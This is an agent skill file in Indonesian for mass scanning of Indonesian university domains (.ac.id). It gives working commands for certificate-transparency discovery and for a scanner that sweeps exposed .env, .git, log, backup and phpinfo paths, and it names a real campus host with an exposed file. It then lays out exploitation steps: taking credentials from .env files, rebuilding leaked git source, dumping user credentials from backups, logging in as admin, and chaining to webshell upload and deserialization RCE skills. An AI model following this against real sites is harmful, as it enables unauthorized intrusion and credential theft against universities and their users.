---
name: ac-id-recon
description: "Recon + exposure scan massal domain .ac.id (kampus Indonesia): discovery via certificate transparency, alive check, sweep path rawan (.env/.git/log Laravel/backup/phpinfo/adminer) dengan deteksi soft-404 dan validator isi, fingerprint framework. Load saat tugasnya 'hack site .ac.id', 'scan domain kampus', 'cari .env kampus', atau enumerasi domain akademik. Tool: $HOME/hacktools/acidhunt.py (terverifikasi)."
---

# SKILL: ac-id-recon — Recon & Exposure Scan .ac.id

**Prinsip:** satu temuan = satu bukti. `200 OK` bukan bukti; isi harus cocok dengan
validator per-path (`[core]` untuk `.git/config`, `KEY=` untuk `.env`, `PHP Version` untuk phpinfo).

## Kapan load
- target berupa domain/daftar domain `*.ac.id`
- operator minta scan massal kampus, cari `.env`/`.git`/log/backup
- perlu data awal sebelum eksploitasi (fingerprint + jalur masuk)

## Discovery (nyata, tanpa API key)

```bash
# 2.563 host unik .ac.id dari crt.sh (di-cache di acid_domains.txt)
curl -s "https://crt.sh/?q=%25.ac.id&output=json" | python3 -c "
import json,sys
d=json.load(sys.stdin); s=set()
for e in d:
    for n in str(e.get('name_value','')).split('\n'):
        n=n.strip().lower().lstrip('*.')
        if n.endswith('.ac.id') and ' ' not in n and '@' not in n: s.add(n)
open('$HOME/hacktools/acid_domains.txt','w').write('\n'.join(sorted(s))); print(len(s))"
```

## Scan

```bash
cd $HOME/hacktools
python3 acidhunt.py -f acid_domains.txt --limit 60 -o out60 --workers 12
python3 acidhunt.py --tld ac.id --limit 40 -o out40            # discovery + scan langsung
python3 acidhunt.py -f list.txt -o out --no-deep               # probe cepat (12 path)
```

Output: `out/results.jsonl` (per host, semua probe + fingerprint), `out/summary.json`.

## Cara kerja deteksi (penting, ini yang membedakan dari scanner asal)
1. **Baseline soft-404**: request `/<random>` dulu, simpan `(status, md5 body)`.
2. **Tanpa follow redirect** — 302 ke halaman login bukan exposure (ini penyebab false positive
   terbesar; sudah diperbaiki dan diuji).
3. **Validator isi per path**:
   | path | harus cocok |
   |---|---|
   | `.env*` | `^[A-Z0-9_]+=` |
   | `.git/config` | `[core]` |
   | `.git/HEAD` | `ref:` / hex40 |
   | `.git/index` | magic `DIRC` |
   | `laravel.log`, `debug.log` | timestamp `[YYYY-MM-DD]` / `production.ERROR` |
   | `wp-config.php.bak`, `configuration.php.bak` | `DB_PASSWORD` / `$password` |
   | `backup.zip` | magic `PK\x03\x04` |
   | `db.sql`, `dump.sql` | `CREATE TABLE` / `INSERT INTO` |
   | `phpinfo.php`, `info.php` | `PHP Version` |
   | `server-status` | `Apache Server Status` |
   | `adminer.php` | `Adminer` |
   | `_ignition/health-check` | `can_execute_commands` |
4. **Filter halaman error**: body berisi `403 Forbidden`/`404 Not Found` bukan temuan.

## Kontrol positif (wajib dijalankan kalau mengubah validator)

```bash
mkdir -p ctl/.git ctl/storage/logs
printf 'APP_KEY=x\n' > ctl/.env
printf '[core]\n' > ctl/.git/config
printf '[2026-01-01] production.ERROR: t\n' > ctl/storage/logs/laravel.log
(cd ctl && python3 -m http.server 8099 &) ; sleep 2
echo "127.0.0.1:8099" > tctl.txt
python3 acidhunt.py -f tctl.txt -o outctl     # harus: 3 exposure (2 critical, 1 high)
```

## Hasil uji lapangan (jujur, apa adanya)
- 46 host `.ac.id` di-scan, 19 alive, 1 exposure nyata:
  `akparbuanawisata.ac.id` → `/info.php` (phpinfo, 85 KB, severity medium)
- 30 host sebelumnya: 9 alive, 0 exposure setelah filter false-positive dipasang
- artinya: hit rate kecil. Jangan janjikan temuan; laporkan apa yang benar-benar keluar.

## Langkah lanjut setelah dapat exposure
1. `.env` → ambil `APP_KEY`, `DB_*`, `AWS_*`; Laravel `APP_DEBUG=true` → cek `/index.php?_ignition`
   atau error page yang membocorkan stack trace.
2. `.git` → rekonstruksi source (`git-dumper` atau `wget -r`), cari kredensial di history.
3. `laravel.log` → berisi SQL query + path + kredensial yang ter-log.
4. `backup.zip`/`db.sql` → dump kredensial pengguna; jangan pernah simpan plaintext ke repo.
5. Setelah punya kredensial → login admin, cek upload, lalu lanjut ke skill `upload-bypass`.

## Referensi tool yang sudah ada
| Skill | Fungsi |
|---|---|
| `webexec` | rantai penuh web (recon → bypass → RCE → post) |
| `dir-enum` | fuzzing direktori dengan wordlist |
| `secret-hunt` | pola secret lebih luas |
| `laravel-env-chain` | `.env` → `APP_KEY` → deserialization RCE |
| `upload-bypass` | upload webshell setelah masuk |

## Keterbatasan
- crt.sh hanya memuat host yang pernah punya sertifikat TLS (subdomain internal bisa absen)
- wildcard cert bisa memunculkan host yang tidak resolve (di-scan → `dead`)
- scan agresif ke banyak host dari satu IP bisa memicu blokir; pakai `--workers` kecil (4–12)